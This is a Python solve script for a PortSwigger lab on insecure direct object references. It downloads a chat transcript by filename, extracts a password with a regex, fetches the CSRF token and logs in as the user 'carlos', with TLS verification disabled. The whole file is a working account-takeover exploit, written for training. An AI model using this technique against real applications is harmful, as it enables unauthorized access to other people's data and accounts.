#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
Insecure direct object references.

Fetches transcript 1.txt from the chat download endpoint, extracts
the password, and logs in as carlos to solve the lab.
"""

import argparse
import re
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_csrf(session: requests.Session, url: str) -> str:
    r = session.get(url)
    m = re.search(r'name="csrf" value="([^"]+)"', r.text)
    if not m:
        raise SystemExit("[-] CSRF token not found")
    return m.group(1)


def fetch_transcript(session: requests.Session, lab: str, filename: str) -> str:
    r = session.get(f"{lab}/download-transcript/{filename}")
    if not r.ok:
        raise SystemExit(f"[-] Could not fetch transcript {filename}: {r.status_code}")
    return r.text


def extract_password(transcript: str) -> str:
    # Look for "password" followed by the value on the same line
    m = re.search(r"password[^:]*[:\s]+([A-Za-z0-9!@#$%^&*_\-]+)", transcript, re.IGNORECASE)
    if not m:
        raise SystemExit("[-] Could not extract password from transcript")
    return m.group(1).strip()


def login(session: requests.Session, lab: str, username: str, password: str) -> bool:
    csrf = get_csrf(session, f"{lab}/login")
    r = session.post(f"{lab}/login", data={"csrf": csrf, "username": username, "password": password})
    return "Invalid username or password" not in r.text


def main():
    parser = argparse.ArgumentParser(
        description="Solve Access Control Lab 9 (IDOR on chat transcript files)"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("--transcript", default="1.txt", help="Transcript file to fetch (default: 1.txt)")
    parser.add_argument("--target", default="carlos")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    print(f"[*] Fetching /download-transcript/{args.transcript}...")
    transcript = fetch_transcript(s, lab, args.transcript)
    print(f"[*] Transcript snippet: {transcript[:200]}")

    password = extract_password(transcript)
    print(f"[+] Extracted password: {password}")

    print(f"[*] Logging in as {args.target}...")
    if login(s, lab, args.target, password):
        print(f"[+] Logged in as {args.target}. Lab solved.")
    else:
        print("[-] Login failed — check transcript manually")


if __name__ == "__main__":
    main()
